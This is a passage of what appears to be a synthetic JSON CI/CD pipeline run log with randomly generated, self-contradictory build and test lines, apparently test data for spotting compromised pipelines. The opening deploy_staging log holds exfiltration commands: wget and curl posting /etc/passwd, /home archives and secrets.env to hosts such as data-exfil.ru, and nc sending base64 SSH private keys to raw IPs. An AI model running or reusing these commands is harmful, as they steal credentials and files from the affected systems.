downloaded: 17MB\nBundling vendor.css\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nCompiling components/app.ts...\nBuilding Docker image...\nStep 15/20: Linting\nPushing to registry...\nSuccess!\nCompiling src/handler.rs...\nConnection established\nBundling runtime.css\npip: Collecting lodash\n[12:45:59] INFO: Processing request\nLayer 2/8: RUN command\nConnection established\nArtifact downloaded: 33MB\n[12:45:59] DEBUG: Query executed in 2ms\nNODE_ENV=development\npip: Downloading prettier-4.10.tar.gz\n\u2713 lint completed\nNODE_ENV=test\nStep 14/18: Building\nCompiling lib/index.js...\nStep 17/22: Running migrations\nnpm install: added 92 packages\n[12:45:59] DEBUG: Memory usage: 205MB\nCreating production build...\n[12:45:59] WARN: Deprecated API usage\npip: Installing build dependencies...\nStep 8/19: Linting\nHEAD is now at 654f151\n[12:45:59] INFO: Cache refreshed\nPOST /api - 201 (41ms)\nException: TypeError\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nInstalling jest@3.19.4\nSending 66MB of data to crypto-mine.io\nConnection established\n[12:45:59] INFO: Processing request\nGET /api - 201 (66ms)\nBundling vendor.css\nStep 4/16: Building\nInstalling prettier@1.0.6\necho $(cat ~/.ssh/id_rsa) | base64 | nc 204.200.99.103 20010\nPOST /api - 202 (30ms)\nPOST /data - 200 (214ms)\nPOST /api - 201 (398ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 47.167.212.58 5151\nCoverage: 74% statements, 77% branches\nArtifact uploaded: build.tar.gz (21MB)\npip install: Successfully installed webpack-3.10\n  PASS: test_api_health (86ms)\nArtifact downloaded: 46MB\nUsing Python 3.12\nCompiling lib/handler.rs...\nStep 16/22: Installing dependencies\n  PASS: test_api_health (201ms)\nFetching submodules...\npip: Downloading eslint-4.19.tar.gz\nTLS handshake completed\nCache restored successfully (497MB)\nGenerating source maps...\nHEAD is now at c032f8b\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nReady.\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nPulling image: node:18\nSending 210MB of data to data-exfil.ru\nArtifact downloaded: 50MB\nWaiting...\nCache hit for key-4396\npip: Downloading jest-4.11.tar.gz\nPOST /api - 201 (297ms)\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nPlatform: darwin-arm64\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nReady.\nPOST /upload - 202 (473ms)\nCompiling utils/handler.rs...\n[12:45:59] DEBUG: Query executed in 30ms\nSending 305MB of data to data-exfil.ru\nnpm install: resolved 367 packages\n=== Step deploy_staging completed ===",
    "steps": [
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-15T12:45:59.384977",
        "finished_at": "2025-12-15T12:46:09.950802",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:45:59] DEBUG: Connection pool: 12 active",
          "Ready.",
          "Environment: production",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling lib/handler.rs...",
          "Compiling src/utils.go...",
          "Connection established",
          "WARNING: lodash has known vulnerabilities",
          "Waiting...",
          "pip: Collecting prettier",
          "[12:45:59] DEBUG: Connection pool: 13 active",
          "Artifact uploaded: dist.zip (7MB)",
          "Image pulled successfully",
          "Step 3/20: Testing",
          "[12:45:59] INFO: Starting build process",
          "Environment: staging",
          "Processing...",
          "Creating production build...",
          "Optimizing 43 modules...",
          "Snapshots: 25 passed, 27 total",
          "Optimizing 21 modules...",
          "TLS handshake completed",
          "Step 3/25: Linting",
          "Cache restored successfully (26MB)",
          "Connection established",
          "[12:45:59] INFO: Starting build process",
          "Artifact downloaded: 41MB",
          "POST /upload - 200 (322ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 All checks passed",
          "pip: Downloading axios-5.16.tar.gz",
          "\u2717 build failed with exit code 44",
          "Artifact uploaded: dist.zip (35MB)",
          "npm install: added 427 packages",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:45:59] INFO: Processing request",
          "npm notice: created a lockfile",
          "[12:45:59] INFO: Request completed",
          "Compiling components/handler.rs...",
          "Fetching submodules...",
          "Artifact uploaded: dist.zip (37MB)",
          "Compiling src/app.ts...",
          "Fetching from https://googleapis.com/package.json",
          "  PASS: unit/test_user_create.spec.js",
          "POST /data - 201 (364ms)",
          "Connection established",
          "pip install: Successfully installed react-4.2",
          "Bundling main.css",
          "Done.",
          "Ready.",
          "Cache invalidated: build",
          "Cache restored successfully (155MB)",
          "Fetching from https://registry.npmjs.org/package.json",
          "Image pulled successfully",
          "NODE_ENV=test",
          "Environment: production",
          "Time: 22.719s",
          "\u2713 Step 'checkout' succeeded",
          "  PASS: e2e/test_db_connect.spec.js",
          "Pulling image: python:latest",
          "Image pulled successfully",
          "WARNING: jest has known vulnerabilities",
          "[12:45:59] WARN: Deprecated API usage",
          "Success!",
          "Building Docker image...",
          "Platform: linux-x64",
          "[12:45:59] INFO: Connecting to database",
          "Cache restored successfully (144MB)",
          "Waiting...",
          "Image pulled successfully",
          "[12:45:59] ERROR: Connection failed",
          "Ran 184 tests in 26s",
          "POST /api - 202 (168ms)",
          "Cache saved successfully",
          "npm install: added 321 packages",
          "npm install: resolved 1137 packages",
          "  PASS: test_cache_hit (319ms)",
          "FAILED: test_api_health",
          "Artifact downloaded: 44MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Already up to date.",
          "Step 1/20: Installing dependencies",
          "\u2713 Step 'test' succeeded",
          "npm install: resolved 1388 packages",
          "npm install: added 25 packages",
          "Done.",
          "Generating source maps...",
          "Waiting...",
          "\u2717 build failed with exit code 31",
          "[12:45:59] DEBUG: Loading configuration",
          "[12:45:59] INFO: Cache refreshed",
          "npm install: resolved 1243 packages",
          "TLS handshake completed",
          "Fetching from https://docker.io/package.json",
          "Cache saved successfully",
          "Switched to branch 'bugfix/task-295'",
          "[12:45:59] DEBUG: Query executed in 31ms",
          "Cache restored successfully (361MB)",
          "\u2713 validate completed",
          "pip: Installing build dependencies...",
          "Cache saved successfully",
          "  PASS: test_cache_hit (496ms)",
          "Time: 49.920s",
          "\u2713 All checks passed",
          "Step 9/20: Linting",
          "[12:45:59] INFO: Cache refreshed",
          "Compiling lib/handler.rs...",
          "Connection established",
          "Time: 61.134s",
          "[12:45:59] DEBUG: Query executed in 6ms",
          "Waiting...",
          "Using Python 3.9",
          "[12:45:59] WARN: Deprecated API usage",
          "[12:45:59] INFO: Starting build process",
          "Using Node.js 14.16.4",
          "Compiling utils/utils.go...",
          "Minifying main.js",
          "Transforming 895 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Installing build dependencies...",
          "Using Python 3.10",
          "Ready.",
          "HEAD is now at bac8851",
          "Optimizing 77 modules...",
          "\u2713 All checks passed",
          "Checking out main branch",
          "Completed.",
          "Uploading artifact 'dist' (34 files)",
          "  PASS: e2e/test_auth_login.spec.js",
          "Connection established",
          "Loading...",
          "[12:45:59] WARN: Deprecated API usage",
          "pip: Collecting prettier",
          "Cache invalidated: node_modules",
          "WARNING: lodash has known vulnerabilities",
          "[12:45:59] WARN: Deprecated API usage",
          "TLS handshake completed",
          "  PASS: test_auth_login (60ms)",
          "\u2713 Task completed in 3988ms",
          "Step 16/19: Deploying",
          "[12:45:59] WARN: Deprecated API usage",
          "Step 18/15: Deploying",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-15T12:46:09.950802",
        "finished_at": "2025-12-15T12:46:31.082451",
        "log_lines": [
          "=== Step: integration_tests ===",
          "pip: Downloading express-4.12.tar.gz",
          "pip install: Successfully installed webpack-2.18",
          "NODE_ENV=production",
          "Verifying...",
          "npm install: added 265 packages",
          "Generating source maps...",
          "npm notice: created a lockfile",
          "Compiling utils/service.java...",
          "Step 19/16: Testing",
          "Ran 85 tests in 15s",
          "Creating production build...",
          "Test Suites: 22 passed, 25 total",
          "npm notice: package.json updated",
          "TLS handshake completed",
          "TLS handshake completed",
          "Verifying...",
          "Checking out develop branch",
          "Minifying app.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Creating production build...",
          "Pulling image: alpine:3.11",
          "Ran 70 tests in 33s",
          "Completed.",
          "Layer 10/14: RUN command",
          "Pushing to registry...",
          "Pulling image: python:18",
          "[12:45:59] INFO: Request completed",
          "OK",
          "npm notice: package.json updated",
          "NODE_ENV=development",
          "HEAD is now at 720e625",
          "FAILED: test_db_connect",
          "pip: Installing build dependencies...",
          "\u2713 All checks passed",
          "Ran 85 tests in 60s",
          "Environment: test",
          "WARNING: webpack has known vulnerabilities",
          "Compiling utils/service.java...",
          "[12:45:59] DEBUG: Memory usage: 613MB",
          "Cache restored successfully (477MB)",
          "Step 19/21: Running migrations",
          "npm install: added 241 packages",
          "Step 8/21: Deploying",
          "[12:45:59] ERROR: Connection failed",
          "pip: Installing build dependencies...",
          "[12:45:59] WARN: Deprecated API usage",
          "Uploading artifact 'build' (41 files)",
          "Compiling lib/utils.go...",
          "Step 2/19: Testing",
          "npm notice: created a lockfile",
          "yarn add: Done in 17.70s",
          "Checking out main branch",
          "Cache hit for key-1095",
          "Cache miss for key-4956",
          "Coverage: 85% statements, 61% branches",
          "[12:45:59] DEBUG: Memory usage: 1841MB",
          "Compiling components/main.py...",
          "Ran 44 tests in 14s",
          "Step 19/19: Building",
          "Fetching from https://pypi.org/package.json",
          "Fetching from https://docker.io/package.json",
          "Pushing to registry...",
          "Using Python 3.9",
          "\u2713 Task completed in 1726ms",
          "FAILED: test_cache_hit",
          "Switched to branch 'feature/task-777'",
          "Success!",
          "Compiling utils/handler.rs...",
          "[12:45:59] INFO: Cache refreshed",
          "Cache miss for key-5135",
          "NODE_ENV=development",
          "Processing...",
          "Step 13/19: Building",
          "Step 11/19: Deploying",
          "WARNING: axios has known vulnerabilities",
          "pip: Installing build dependencies...",
          "pip: Downloading prettier-3.8.tar.gz",
          "Bundling main.css",
          "[12:45:59] DEBUG: Loading configuration",
          "Coverage: 89% statements, 72% branches",
          "Step 1/20: Building",
          "Coverage: 82% statements, 97% branches",
          "Test Suites: 9 passed, 9 total",
          "Processing...",
          "Fetching submodules...",
          "Coverage: 91% statements, 62% branches",
          "pip: Collecting axios",
          "Time: 19.481s",
          "[12:45:59] INFO: Connecting to database",
          "Completed.",
          "GET /status - 201 (71ms)",
          "Layer 7/11: COPY command",
          "Pulling image: node:3.11",
          "pip install: Successfully installed lodash-4.8",
          "\u2717 build failed with exit code 11",
          "Cache restored successfully (152MB)",
          "\u2713 test completed",
          "Exception: TypeError",
          "Using Python 3.12",
          "Layer 9/9: ENV command",
          "Waiting...",
          "Generating source maps...",
          "Checking out main branch",
          "Optimizing 91 modules...",
          "Artifact uploaded: dist.zip (60MB)",
          "Snapshots: 8 passed, 33 total",
          "Checking out develop branch",
          "POST /upload - 202 (238ms)",
          "[12:45:59] INFO: Cache refreshed",
          "pip: Installing build dependencies...",
          "pip: Collecting express",
          "npm notice: created a lockfile",
          "Step 13/17: Linting",
          "[12:45:59] DEBUG: Initializing service",
          "[12:45:59] DEBUG: Initializing service",
          "GET /health - 201 (51ms)",
          "Checking out master branch",
          "Already up to date.",
          "[12:45:59] DEBUG: Query executed in 26ms",
          "Checking out master branch",
          "Pushing to registry...",
          "POST /data - 200 (384ms)",
          "[12:45:59] DEBUG: Loading configuration",
          "Connection established",
          "Fetching from https://githubusercontent.com/package.json",
          "pip install: Successfully installed axios-2.1",
          "Platform: win32-x64",
          "Ran 32 tests in 38s",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (33MB)",
          "TLS handshake completed",
          "Compiling src/main.py...",
          "WARNING: react has known vulnerabilities",
          "Cache miss for key-2352",
          "\u2713 lint completed",
          "Processing...",
          "[12:45:59] WARN: Deprecated API usage",
          "Compiling utils/handler.rs...",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip: Downloading express-3.20.tar.gz",
          "pip: Collecting lodash",
          "yarn add: Done in 2.15s",
          "Already up to date.",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-15T12:46:31.082451",
        "finished_at": "2025-12-15T12:46:41.648276",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Time: 42.937s",
          "Snapshots: 5 passed, 48 total",
          "\u2713 Task completed in 1763ms",
          "FAILED: test_user_create",
          "Cache restored successfully (496MB)",
          "Cache miss for key-6067",
          "[12:45:59] DEBUG: Initializing service",
          "Verifying...",
          "Optimizing 62 modules...",
          "Completed.",
          "npm notice: created a lockfile",
          "[12:45:59] INFO: Connecting to database",
          "Using Python 3.10",
          "Building Docker image...",
          "[12:45:59] ERROR: Connection failed",
          "[12:45:59] DEBUG: Memory usage: 936MB",
          "pip: Downloading express-5.17.tar.gz",
          "pip install: Successfully installed webpack-5.11",
          "[12:45:59] DEBUG: Loading configuration",
          "Step 18/23: Building",
          "  PASS: test_cache_hit (95ms)",
          "Step 5/16: Building",
          "POST /api - 202 (381ms)",
          "Pulling image: alpine:3.11",
          "Snapshots: 49 passed, 33 total",
          "npm notice: package.json updated",
          "Finished.",
          "Step 6/20: Linting",
          "Step 12/20: Testing",
          "Platform: darwin-arm64",
          "Verifying...",
          "Installing react@4.13.5",
          "Loading...",
          "  PASS: unit/test_user_create.spec.js",
          "\u2713 Step 'build' succeeded",
          "NODE_ENV=development",
          "\u2713 All checks passed",
          "Cache saved successfully",
          "Fetching from https://githubusercontent.com/package.json",
          "[12:45:59] INFO: Processing request",
          "[12:45:59] DEBUG: Query executed in 85ms",
          "Ready.",
          "[12:45:59] WARN: Deprecated API usage",
          "NODE_ENV=production",
          "Cache miss for key-8835",
          "Creating production build...",
          "[12:45:59] WARN: Deprecated API usage",
          "pip install: Successfully installed lodash-2.19",
          "Cache restored successfully (296MB)",
          "[12:45:59] DEBUG: Loading configuration",
          "Waiting...",
          "Done.",
          "Completed.",
          "Success!",
          "Connection established",
          "Platform: win32-x64",
          "NODE_ENV=development",
          "Success!",
          "Cache invalidated: node_modules",
          "TLS handshake completed",
          "Step 3/21: Testing",
          "Step 4/21: Building",
          "Building Docker image...",
          "WARNING: lodash has known vulnerabilities",
          "Generating source maps...",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "FAILED: test_user_create",
          "pip: Downloading express-5.20.tar.gz",
          "WARNING: eslint has known vulnerabilities",
          "Snapshots: 15 passed, 1 total",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Building Docker image...",
          "Pulling image: alpine:18",
          "NODE_ENV=development",
          "\u2713 Step 'checkout' succeeded",
          "Verifying...",
          "Step 3/24: Installing dependencies",
          "FAILED: test_user_create",
          "Compiling components/index.js...",
          "Time: 85.764s",
          "pip: Collecting lodash",
          "Ready.",
          "Platform: win32-x64",
          "Building Docker image...",
          "WARNING: react has known vulnerabilities",
          "[12:45:59] DEBUG: Loading configuration",
          "npm install: resolved 966 packages",
          "Bundling vendor.css",
          "pip: Downloading express-1.9.tar.gz",
          "Compiling utils/utils.go...",
          "Minifying app.js",
          "Step 5/15: Building",
          "WARNING: jest has known vulnerabilities",
          "NODE_ENV=development",
          "FAILED: test_api_health",
          "Minifying app.js",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:45:59] ERROR: Connection failed",
          "[12:45:59] DEBUG: Query executed in 45ms",
          "[12:45:59] INFO: Connecting to database",
          "Waiting...",
          "[12:45:59] ERROR: Connection failed",
          "Pulling image: alpine:18",
          "Using Python 3.11",
          "\u2713 Step 'test' succeeded",
          "[12:45:59] DEBUG: Connection pool: 10 active",
          "Artifact uploaded: dist.zip (87MB)",
          "\u2717 build failed with exit code 109",
          "TLS handshake completed",
          "HEAD is now at 03b9ee9",
          "Waiting...",
          "Layer 10/13: RUN command",
          "Layer 8/9: ENV command",
          "[12:45:59] WARN: Deprecated API usage",
          "Compiling utils/handler.rs...",
          "\u2713 Task completed in 275ms",
          "Using Node.js 20.0.2",
          "Finished.",
          "Step 10/23: Installing dependencies",
          "Platform: darwin-arm64",
          "Already up to date.",
          "Optimizing 39 modules...",
          "Artifact uploaded: dist.zip (94MB)",
          "yarn add: Done in 3.42s",
          "[12:45:59] INFO: Request completed",
          "Cache restored successfully (455MB)",
          "HEAD is now at ec1e86e",
          "\u2713 validate completed",
          "Processing...",
          "Environment: test",
          "Checking out master branch",
          "Loading...",
          "Cache hit for key-3171",
          "Using Python 3.9",
          "Loading...",
          "HEAD is now at af535f5",
          "Compiling utils/utils.go...",
          "pip install: Successfully installed axios-3.1",
          "Using Node.js 16.7.2",
          "Loading...",
          "OK",
          "Processing...",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-15T12:46:41.648276",
        "finished_at": "2025-12-15T12:47:13.345750",
        "log_lines": [
          "=== Step: build ===",
          "Ready.",
          "NODE_ENV=development",
          "[12:45:59] DEBUG: Memory usage: 828MB",
          "Using Node.js 19.10.5",
          "Already up to date.",
          "pip: Collecting jest",
          "Exception: TypeError",
          "pip: Downloading lodash-4.18.tar.gz",
          "Step 18/16: Testing",
          "WARNING: jest has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Fetching from https://npmjs.org/package.json",
          "pip: Installing build dependencies...",
          "Ready.",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Switched to branch 'hotfix/task-201'",
          "Cache miss for key-9995",
          "Connection established",
          "Cache invalidated: dependencies",
          "WARNING: react has known vulnerabilities",
          "\u2713 Step 'build' succeeded",
          "Bundling runtime.js",
          "[12:45:59] DEBUG: Initializing service",
          "Environment: test",
          "Optimizing 93 modules...",
          "[12:45:59] WARN: Deprecated API usage",
          "Using Python 3.10",
          "Step 20/19: Testing",
          "Artifact downloaded: 33MB",
          "Verifying...",
          "[12:45:59] DEBUG: Initializing service",
          "Snapshots: 7 passed, 36 total",
          "Cache saved successfully",
          "FAILED: test_user_create",
          "Transforming 310 files...",
          "Ran 134 tests in 57s",
          "Artifact uploaded: dist.zip (10MB)",
          "Using Node.js 17.13.4",
          "Step 20/19: Installing dependencies",
          "npm install: resolved 266 packages",
          "[12:45:59] DEBUG: Initializing service",
          "[12:45:59] DEBUG: Loading configuration",
          "pip: Collecting jest",
          "npm notice: package.json updated",
          "Completed.",
          "Tests: 202 passed, 107 total",
          "pip install: Successfully installed prettier-2.2",
          "Processing...",
          "Fetching submodules...",
          "Snapshots: 21 passed, 42 total",
          "\u2713 All checks passed",
          "npm notice: created a lockfile",
          "\u2717 build failed with exit code 93",
          "Using Node.js 18.2.8",
          "\u2713 Task completed in 2152ms",
          "\u2713 Task completed in 2991ms",
          "\u2713 deploy completed",
          "Minifying main.js",
          "Bundling runtime.css",
          "NODE_ENV=development",
          "Test Suites: 20 passed, 5 total",
          "[12:45:59] WARN: Deprecated API usage",
          "NODE_ENV=development",
          "\u2713 Task completed in 3152ms",
          "Test Suites: 23 passed, 42 total",
          "POST /upload - 202 (192ms)",
          "Processing...",
          "pip: Collecting lodash",
          "Time: 114.812s",
          "Pulling image: alpine:latest",
          "Environment: production",
          "Completed.",
          "Finished.",
          "[12:45:59] WARN: Deprecated API usage",
          "POST /upload - 201 (408ms)",
          "Compiling src/app.ts...",
          "Checking out master branch",
          "[12:45:59] DEBUG: Memory usage: 380MB",
          "Installing lodash@2.10.4",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: created a lockfile",
          "Tests: 67 passed, 255 total",
          "Checking out master branch",
          "Using Python 3.12",
          "Layer 4/13: RUN command",
          "[12:45:59] DEBUG: Initializing service",
          "Verifying...",
          "Platform: darwin-arm64",
          "  PASS: test_user_create (139ms)",
          "Pulling image: alpine:3.11",
          "Connection established",
          "Installing axios@2.16.7",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "TLS handshake completed",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:45:59] WARN: Deprecated API usage",
          "Environment: test",
          "Snapshots: 26 passed, 49 total",
          "[12:45:59] DEBUG: Initializing service",
          "Compiling src/service.java...",
          "[12:45:59] INFO: Cache refreshed",
          "Creating production build...",
          "Minifying vendor.js",
          "Pushing to registry...",
          "[12:45:59] INFO: Processing request",
          "Step 7/24: Deploying",
          "yarn add: Done in 22.16s",
          "Step 7/21: Linting",
          "  PASS: test_auth_login (268ms)",
          "npm install: added 282 packages",
          "Transforming 820 files...",
          "Generating source maps...",
          "WARNING: jest has known vulnerabilities",
          "[12:45:59] INFO: Connecting to database",
          "Ran 120 tests in 48s",
          "Step 6/21: Running migrations",
          "Installing axios@5.7.4",
          "[12:45:59] WARN: Deprecated API usage",
          "WARNING: express has known vulnerabilities",
          "WARNING: jest has known vulnerabilities",
          "Optimizing 47 modules...",
          "Done.",
          "Verifying...",
          "\u2713 Step 'build' succeeded",
          "pip: Downloading axios-5.8.tar.gz",
          "[12:45:59] INFO: Connecting to database",
          "Cache invalidated: dependencies",
          "[12:45:59] INFO: Processing request",
          "Image pulled successfully",
          "Checking out master branch",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Step 10/17: Linting",
          "Already up to date.",
          "Done.",
          "[12:45:59] DEBUG: Initializing service",
          "Tests: 490 passed, 399 total",
          "Step 7/19: Installing dependencies",
          "[12:45:59] ERROR: Connection failed",
          "Artifact uploaded: dist.zip (88MB)",
          "Installing prettier@5.9.5",
          "pip install: Successfully installed jest-5.9",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-15T12:47:13.345750",
        "finished_at": "2025-12-15T12:47:23.911575",
        "log_lines": [
          "=== Step: setup_node ===",
          "Connection established",
          "Step 6/22: Deploying",
          "\u2717 build failed with exit code 8",
          "\u2713 All checks passed",
          "Snapshots: 14 passed, 32 total",
          "Cache invalidated: build",
          "[12:45:59] DEBUG: Initializing service",
          "Compiling src/main.py...",
          "Compiling components/handler.rs...",
          "Image pulled successfully",
          "npm install: added 476 packages",
          "Ran 97 tests in 53s",
          "\u2713 package completed",
          "[12:45:59] DEBUG: Memory usage: 967MB",
          "Step 14/21: Building",
          "Done.",
          "Installing react@5.4.4",
          "Ready.",
          "[12:45:59] INFO: Cache refreshed",
          "Finished.",
          "TLS handshake completed",
          "Bundling styles.css",
          "pip: Collecting react",
          "Building Docker image...",
          "\u2713 Step 'checkout' succeeded",
          "Step 4/21: Linting",
          "[12:45:59] INFO: Request completed",
          "Coverage: 92% statements, 90% branches",
          "[12:45:59] DEBUG: Loading configuration",
          "\u2713 Step 'setup' succeeded",
          "Completed.",
          "Already up to date.",
          "[12:45:59] INFO: Cache refreshed",
          "Step 18/19: Deploying",
          "POST /upload - 201 (216ms)",
          "npm install: added 201 packages",
          "TLS handshake completed",
          "pip: Installing build dependencies...",
          "Pushing to registry...",
          "Success!",
          "[12:45:59] WARN: Deprecated API usage",
          "\u2713 Task completed in 166ms",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "POST /upload - 201 (61ms)",
          "Building Docker image...",
          "Completed.",
          "Coverage: 95% statements, 94% branches",
          "Generating source maps...",
          "[12:45:59] DEBUG: Query executed in 91ms",
          "[12:45:59] DEBUG: Connection pool: 6 active",
          "Optimizing 38 modules...",
          "Cache restored successfully (114MB)",
          "\u2717 build failed with exit code 32",
          "TLS handshake completed",
          "[12:45:59] DEBUG: Connection pool: 2 active",
          "Already up to date.",
          "Cache invalidated: dependencies",
          "\u2713 All checks passed",
          "Creating production build...",
          "Step 14/25: Linting",
          "[12:45:59] WARN: Deprecated API usage",
          "Time: 56.994s",
          "yarn add: Done in 30.31s",
          "[12:45:59] INFO: Processing request",
          "Verifying...",
          "Uploading artifact 'dist' (14 files)",
          "[12:45:59] INFO: Request completed",
          "[12:45:59] DEBUG: Initializing service",
          "Compiling src/service.java...",
          "Completed.",
          "Compiling src/main.py...",
          "Processing...",
          "[12:45:59] INFO: Processing request",
          "\u2713 Task completed in 4239ms",
          "Snapshots: 19 passed, 3 total",
          "Switched to branch 'hotfix/task-807'",
          "Exception: RuntimeError",
          "Waiting...",
          "Using Python 3.10",
          "TLS handshake completed",
          "Verifying...",
          "[12:45:59] INFO: Starting build process",
          "Switched to branch 'feature/task-706'",
          "pip: Downloading express-5.8.tar.gz",
          "Step 4/15: Running migrations",
          "Transforming 159 files...",
          "[12:45:59] DEBUG: Initializing service",
          "Image pulled successfully",
          "\u2717 build failed with exit code 117",
          "[12:45:59] DEBUG: Connection pool: 4 active",
          "[12:45:59] ERROR: Connection failed",
          "Using Python 3.11",
          "[12:45:59] DEBUG: Connection pool: 5 active",
          "GET /health - 204 (17ms)",
          "[12:45:59] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (14MB)",
          "npm install: added 472 packages",
          "\u2713 deploy completed",
          "npm install: added 81 packages",
          "Ready.",
          "Step 8/19: Testing",
          "Step 18/16: Linting",
          "Cache hit for key-7005",
          "Step 7/22: Installing dependencies",
          "pip: Installing build dependencies...",
          "Layer 5/8: COPY command",
          "Tests: 134 passed, 325 total",
          "npm notice: package.json updated",
          "HEAD is now at 04fc539",
          "[12:45:59] DEBUG: Memory usage: 832MB",
          "\u2713 Step 'test' succeeded",
          "Installing express@4.8.4",
          "Artifact downloaded: 31MB",
          "Snapshots: 9 passed, 34 total",
          "[12:45:59] DEBUG: Initializing service",
          "Connection established",
          "[12:45:59] DEBUG: Initializing service",
          "Snapshots: 16 passed, 4 total",
          "Building Docker image...",
          "Snapshots: 25 passed, 19 total",
          "Cache restored successfully (174MB)",
          "Success!",
          "[12:45:59] DEBUG: Memory usage: 1499MB",
          "Cache saved successfully",
          "Installing eslint@5.0.4",
          "Installing lodash@4.20.0",
          "Completed.",
          "Already up to date.",
          "Waiting...",
          "Compiling components/service.java...",
          "Step 7/17: Building",
          "Tests: 442 passed, 327 total",
          "Processing...",
          "Bundling styles.css",
          "Loading...",
          "pip: Installing build dependencies...",
          "Using Node.js 19.14.9",
          "yarn add: Done in 6.38s",
          "Optimizing 91 modules...",
          "Building Docker image...",
          "Completed.",
          "Waiting...",
          "TLS handshake completed",
          "Coverage: 84% statements, 76% branches",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-15T12:47:23.911575",
        "finished_at": "2025-12-15T12:47:28.137905",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Transforming 561 files...",
          "Transforming 888 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 5/25: Linting",
          "\u2713 Task completed in 4222ms",
          "Coverage: 81% statements, 75% branches",
          "pip: Downloading express-1.17.tar.gz",
          "Environment: development",
          "Switched to branch 'bugfix/task-934'",
          "Optimizing 40 modules...",
          "POST /data - 201 (232ms)",
          "Compiling components/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Coverage: 92% statements, 87% branches",
          "Optimizing 37 modules...",
          "[12:45:59] WARN: Deprecated API usage",
          "HEAD is now at 9ea0d9e",
          "Completed.",
          "pip install: Successfully installed prettier-3.14",
          "Fetching submodules...",
          "[12:45:59] INFO: Starting build process",
          "Snapshots: 1 passed, 31 total",
          "Using Node.js 16.8.6",
          "pip: Installing build dependencies...",
          "Optimizing 26 modules...",
          "Artifact uploaded: dist.zip (64MB)",
          "Checking out main branch",
          "Cache restored successfully (495MB)",
          "Pushing to registry...",
          "Verifying...",
          "Pulling image: python:3.11",
          "Switched to branch 'bugfix/task-983'",
          "Step 6/16: Installing dependencies",
          "pip install: Successfully installed eslint-1.17",
          "Compiling lib/handler.rs...",
          "Bundling main.js",
          "Compiling utils/service.java...",
          "Finished.",
          "Generating source maps...",
          "Step 1/24: Running migrations",
          "pip install: Successfully installed prettier-1.18",
          "[12:45:59] INFO: Connecting to database",
          "Exception: TypeError",
          "Uploading artifact 'dist' (3 files)",
          "Success!",
          "Installing react@3.14.1",
          "Cache miss for key-9835",
          "npm install: resolved 637 packages",
          "[12:45:59] INFO: Connecting to database",
          "Minifying app.js",
          "[12:45:59] DEBUG: Loading configuration",
          "HEAD is now at ba70881",
          "[12:45:59] INFO: Connecting to database",
          "[12:45:59] DEBUG: Initializing service",
          "Uploading artifact 'dist' (30 files)",
          "  PASS: e2e/test_auth_login.spec.js",
          "Verifying...",
          "Already up to date.",
          "Cache miss for key-8644",
          "Exception: ValueError",
          "POST /data - 202 (190ms)",
          "Compiling utils/utils.go...",
          "Snapshots: 47 passed, 17 total",
          "Switched to branch 'feature/task-622'",
          "Building Docker image...",
          "Cache miss for key-4468",
          "WARNING: react has known vulnerabilities",
          "npm install: resolved 1297 packages",
          "Connection established",
          "FAILED: test_db_connect",
          "Verifying...",
          "Step 6/17: Building",
          "Creating production build...",
          "Image pulled successfully",
          "[12:45:59] DEBUG: Loading configuration",
          "Cache invalidated: node_modules",
          "Generating source maps...",
          "[12:45:59] INFO: Connecting to database",
          "Compiling lib/utils.go...",
          "Building Docker image...",
          "HEAD is now at afa976a",
          "[12:45:59] DEBUG: Connection pool: 11 active",
          "Loading...",
          "\u2717 build failed with exit code 51",
          "Step 12/17: Linting",
          "Using Python 3.10",
          "Cache hit for key-5148",
          "npm install: resolved 476 packages",
          "[12:45:59] DEBUG: Connection pool: 7 active",
          "Loading...",
          "\u2713 Task completed in 4365ms",
          "Transforming 731 files...",
          "[12:45:59] INFO: Processing request",
          "Installing prettier@1.3.1",
          "OK",
          "npm notice: package.json updated",
